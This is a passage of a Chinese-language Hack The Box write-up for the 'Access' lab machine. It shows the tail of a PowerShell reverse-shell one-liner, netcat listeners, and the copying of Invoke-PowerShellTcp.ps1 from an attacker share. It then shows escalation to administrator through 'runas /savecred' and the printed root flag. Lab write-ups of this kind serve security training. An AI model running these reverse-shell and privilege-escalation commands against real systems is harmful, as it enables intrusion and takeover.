0, $Buffer.Length)) -gt 0) &#123;$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try &#123;Invoke-Expression $Command 2&gt;&amp;1 | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>] <span class="hljs-number">49157</span><br>SHELL&gt; whoami<br>access\security<br>SHELL&gt; pwd<br><br>Path <br><br>----  <br><br>C:\Users\security\Desktop <br><br>SHELL&gt; <br></code></pre></td></tr></table></figure>
+
+<p>15、在初始权限上，想着直接上winpeas.exe工具的，结果有策略限制，没法运行这个工具，只好手工枚举了</p>
+<p>16、重点在 <code>Password required            No</code> ，登录该账号不需要密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\security&gt;<br>net user administratorer <br>User name                    Administrator<br>Full Name                    <br>Comment                      Built-in account <span class="hljs-keyword">for</span> administering the computer/domain<br>User<span class="hljs-number">&#x27;</span>s comment               <br>Country code                 <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span> <span class="hljs-number">10</span>:<span class="hljs-number">01</span>:<span class="hljs-number">12</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span> <span class="hljs-number">10</span>:<span class="hljs-number">01</span>:<span class="hljs-number">12</span> PM<br>Password required            No<br>User may change password     No<br><br>Workstations allowed         All<br>Logon script                 <br>User profile                 <br>Home directory               <br>Last logon                   <span class="hljs-number">5</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2024</span> <span class="hljs-number">8</span>:<span class="hljs-number">40</span>:<span class="hljs-number">32</span> AM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Administrators       *Users                <br>Global Group memberships     *None                 <br>The command completed successfully.<br><br><br>C:\Users\security&gt;<br></code></pre></td></tr></table></figure>
+
+<p>17、runas 命令: runas 是 Windows 系统上自带的一个命令，通过此命令可以以指定权限级别间接启动我们的程序，而不止是继承父进程的权限。用到的其实是凭证。</p>
+<p>18、直接使用runas进行运行反弹shell，获取到管理员的权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">SHELL&gt; copy \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\share\Invoke-PowerShellTcp.ps1 p.ps1<br>SHELL&gt; dir<br><br>    Directory: C:\Users\security<br><br>Mode                LastWriteTime     Length Name                                                                                                                                      <br>----                -------------     ------ ----                                                                                                                                      <br>d----         <span class="hljs-number">8</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">8</span>:<span class="hljs-number">37</span> PM            .yawcam                                                                                                                                   <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Contacts                                                                                                                                  <br>d-r--         <span class="hljs-number">5</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">12</span> AM            Desktop                                                                                                                                   <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Documents                                                                                                                                 <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Downloads                                                                                                                                 <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Favorites                                                                                                                                 <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Links                                                                                                                                     <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Music                                                                                                                                     <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Pictures                                                                                                                                  <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Saved Games                                                                                                                               <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> PM            Searches                                                                                                                                  <br>d-r--         <span class="hljs-number">8</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">8</span>:<span class="hljs-number">39</span> PM            Videos                                                                                                                                    <br>-a---         <span class="hljs-number">5</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">6</span>:<span class="hljs-number">30</span> PM       <span class="hljs-number">4402</span> p.ps1                                                                                                                                     <br><br><br>SHELL&gt; runas /user:ACCESS\Administrator /savecred <span class="hljs-string">&quot;powershell -nop -exec bypass -file C:\Users\security\p.ps1&quot;</span><br>SHELL&gt; <br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">53</span> <br>listening on [any] <span class="hljs-number">53</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>] <span class="hljs-number">49163</span><br>Windows PowerShell running as user Administrator on ACCESS<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2015 Microsoft Corporation. All rights reserved.<br><br>PS C:\Windows\system32&gt;whoami<br>access\administrator<br>PS C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure>
+
+<p>19、获取最终的flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Windows\system32&gt; cd C:/Users/administrator/Desktop<br>PS C:\Users\administrator\Desktop&gt; dir<br><br><br>    Directory: C:\Users\administrator\Desktop<br><br><br>Mode                LastWriteTime     Length Name                              <br>----                -------------     ------ ----                              <br>-ar--         <span class="hljs-number">5</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">8</span>:<span class="hljs-number">40</span> AM         <span class="hljs-number">34</span> root.txt                          <br><br><br>PS C:\Users\administrator\Desktop&gt; cat root.txt<br><span class="hljs-number">8983760b</span>12a9d9aa1a137350431800b6<br>PS C:\Users\administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>20、如果靶机可以运行 winpeas.exe 文件的话，估计就直接提权了，结果这里，让我通过Runas来提权。。。</p>
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/156</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Access-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/22/Access-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/24/Aero-htb-writeup/" title="Aero-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Aero-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/21/Netmon-htb-writeup/" title="Netmon-htb-writeup">
+                        <span class="hidden-mobile">Netmon-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
